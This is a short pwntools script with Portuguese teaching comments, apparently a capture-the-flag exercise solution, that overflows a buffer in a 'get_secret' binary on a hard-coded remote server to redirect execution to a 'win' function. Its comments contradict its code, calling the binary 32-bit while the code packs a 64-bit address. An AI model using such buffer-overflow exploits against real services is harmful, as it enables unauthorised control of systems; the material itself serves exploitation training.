# Instalar o pip e as pwntools: pip3 install --user pwntools
#
# Ao obter o erro de execução do binário: No such file or directory, instalar as libs 32 bits, visto que o binário é 32 bits (x86):
# sudo dpkg --add-architecture i386
# sudo apt update -y
# sudo apt install -y libc6:i386 libncurses5:i386 libstdc++6:i386
#
# Usar o codigo seguinte:

from pwn import *
import binascii

local = False

if local:
	r = process("./get_secret")
else:
	r = remote("167.99.243.7", 5003)

s = r.recvuntil("\n")
print(s)

# Mudar 0 para o numero correcto de A's de forma a reescrever o return address
# com o address da funcao win
n = 57

# p32() -> converte para string um endereco de tamanho 4 bytes
# Equivalente a struct.pack("<I", 0xdeadbeef)
# Se o executavel fosse 64 bits devia ser usada a funcao p64()
# Alterar para o endereco correcto da funcao win 0x80...
# gdb => disass win e sacar o primeiro endereço de memoria
win_function = p64(0x004007f4)

payload = b"A"*n + win_function 
r.sendline(payload)

r.interactive()
